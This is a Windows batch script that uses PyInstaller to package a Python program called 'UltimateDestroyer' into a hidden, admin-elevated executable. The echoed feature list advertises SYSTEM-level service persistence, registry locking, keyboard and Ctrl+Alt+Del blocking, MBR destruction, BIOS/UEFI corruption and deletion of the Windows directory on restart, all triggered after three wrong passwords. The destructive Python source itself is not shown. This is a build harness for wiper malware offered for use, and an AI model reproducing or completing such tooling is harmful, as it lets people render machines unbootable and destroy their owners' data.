@echo off
echo ===================================================
echo   BUILD ULTIMATE DESTROYER v4.0 - SYSTEM LEVEL
echo ===================================================
echo.

echo 🔧 INSTALLING SYSTEM LEVEL DEPENDENCIES...
echo.
pip install pyinstaller pywin32 psutil pypiwin32

echo.
echo 🚀 BUILDING SYSTEM LEVEL EXECUTABLE...
echo.
python -m PyInstaller --onefile --noconsole ^
--name "SystemLevelDestroyer" ^
--uac-admin ^
--add-data ".;." ^
--hidden-import win32api ^
--hidden-import win32con ^
--hidden-import win32process ^
--hidden-import win32gui ^
--hidden-import win32service ^
--hidden-import win32serviceutil ^
--hidden-import servicemanager ^
--hidden-import winreg ^
--hidden-import psutil ^
--hidden-import atexit ^
"UltimateDestroyer.py"

echo.
if exist dist\SystemLevelDestroyer.exe (
    copy dist\SystemLevelDestroyer.exe .
    echo ✅ SystemLevelDestroyer.exe BUILT SUCCESSFULLY!
    echo.
    echo 📊 FILE INFO:
    for /f "tokens=*" %%i in ('dir SystemLevelDestroyer.exe ^| find "SystemLevelDestroyer.exe"') do echo   %%i
) else (
    echo ❌ BUILD FAILED!
    echo Check dependencies installation
)

echo.
echo ===================================================
echo   🔥 SYSTEM LEVEL FEATURES:
echo ===================================================
echo.
echo 🚀 SIGN OUT PROOF:
echo    • Windows Service installation
echo    • Auto-restart on user sign out
echo    • Runs as SYSTEM user
echo    • Registry persistence
echo.
echo 💀 BOOT TIME OS DESTRUCTION:
echo    • Schedule OS wipe on system restart
echo    • Complete MBR destruction
echo    • BIOS/UEFI corruption
echo    • Windows directory deletion
echo.
echo 🔧 KERNEL LEVEL CONTROL:
echo    • Disable Ctrl+Alt+Del
echo    • Block all keyboard inputs
echo    • High process priority
echo    • Registry lock to prevent removal
echo.
echo ===================================================
echo   ⚠️  EXTREME WARNING:
echo ===================================================
echo.
echo ❌ OS WILL BE COMPLETELY DESTROYED ON RESTART!
echo ❌ SYSTEM WILL BE UNBOOTABLE!
echo ✅ TEST IN VIRTUALBOX WITH SNAPSHOT ONLY!
echo.
echo ===================================================
echo   🎯 TESTING PROCEDURE:
echo ===================================================
echo 1. Run SystemLevelDestroyer.exe (as Admin)
echo 2. Enter wrong password 3 times
echo 3. Destruction activated immediately
echo 4. Try to sign out → Program restarts as SYSTEM
echo 5. Try to restart system → OS COMPLETELY DESTROYED
echo 6. VirtualBox snapshot restore required
echo.
echo 📁 SINGLE FILE: SystemLevelDestroyer.exe
echo   (All system-level features integrated)
echo.
pause